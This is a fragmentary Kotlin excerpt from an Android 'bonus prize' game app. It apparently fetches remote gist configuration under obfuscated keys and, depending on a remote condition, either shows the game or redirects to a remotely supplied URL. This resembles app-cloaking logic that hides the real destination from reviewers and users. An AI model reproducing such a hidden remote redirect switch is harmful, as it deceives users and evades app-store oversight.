package com.bonusprize.chestopen

import android.app.Activity
import android.content.Context
import androidx.appcompat.app.AppCompatActivity
import com.bonusprize.chestopen.databinding.ActivityMainBinding
import com.bonusprize.chestopen.game.AppDataStore
import com.bonusprize.chestopen.tool.Network
...
class BonusPrize3902Helper(
    ...
    constructor(
        ...
        scope,
        Network(
            context.getString(R.string.Wp2dZh)
        ),
    )
    ...
    private fun navigateToGameScreen() {
        scope.launch(Dispatchers.IO) {
            dataStore.updateKeyz { "bonusPrize39021" }
    ...
    private fun navigateToNext(url: String) {
        scope.launch(Dispatchers.IO) {
            ...
            dataStore.updateKeyz { "bonusPrize39020" }
    ...
    private fun fetchRemoteConfigData(activity: Activity) {
        scope.launch {
            network.getGistJSON(
                onSuccess = { json ->
                    val condition = json.getString("cowboy")
                    val redirectUrl = json.getString("brain")
    ...
    companion object {
        val FRAGMENT_ID = R.id.bonusPrize3902Fragment
    }
}